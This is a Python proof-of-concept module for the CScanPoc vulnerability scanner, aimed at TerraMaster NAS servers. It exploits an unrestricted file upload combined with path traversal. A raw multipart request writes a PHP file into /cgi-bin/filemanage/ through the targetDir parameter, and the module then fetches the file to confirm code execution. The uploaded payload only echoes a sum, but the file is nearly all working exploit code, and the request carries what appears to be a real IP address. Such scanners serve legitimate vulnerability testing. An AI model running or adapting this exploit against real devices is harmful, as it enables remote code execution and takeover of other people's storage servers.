# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'TerraMaster_0003'  # 平台漏洞编号，留空
    name = 'TerraMaster NAS网络存储服务器 getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        铁威马（TerraMaster）NAS网络存储服务器无限制getshell.
        /include/upload.php?targetDir=
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '铁威马NAS网络存储服务器'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5e76be90-411b-469f-8501-3e75e14ac9ab'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            raw = """
POST /include/upload.php?targetDir=../cgi-bin/filemanage/ HTTP/1.1
Accept: text/*
Content-Type: multipart/form-data; boundary=----------ei4KM7ae0KM7GI3ei4cH2ei4KM7GI3
User-Agent: Shockwave Flash
Host: 218.92.26.50:8080
Content-Length: 721
Proxy-Connection: Keep-Alive
Pragma: no-cache
Cookie: PHPSESSID=

------------ei4KM7ae0KM7GI3ei4cH2ei4KM7GI3
Content-Disposition: form-data; name="Filename"

1.php
------------ei4KM7ae0KM7GI3ei4cH2ei4KM7GI3
Content-Disposition: form-data; name="name"

1.php
------------ei4KM7ae0KM7GI3ei4cH2ei4KM7GI3
Content-Disposition: form-data; name="chunk"

0
------------ei4KM7ae0KM7GI3ei4cH2ei4KM7GI3
Content-Disposition: form-data; name="chunks"

1
------------ei4KM7ae0KM7GI3ei4cH2ei4KM7GI3
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: application/octet-stream

<?php echo (199995555555+3565488);?>
------------ei4KM7ae0KM7GI3ei4cH2ei4KM7GI3
Content-Disposition: form-data; name="Upload"

Submit Query
------------ei4KM7ae0KM7GI3ei4cH2ei4KM7GI3--
            """
            url = arg + '/include/upload.php?targetDir=../cgi-bin/filemanage/'
            code2, head, res, errcode, _ = hh.http(url, raw=raw)
            code2, head, res, errcode, _ = hh.http(
                arg + '/cgi-bin/filemanage/1.php')

            if (code2 == 200) and (res == '199999121043'):
                # security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
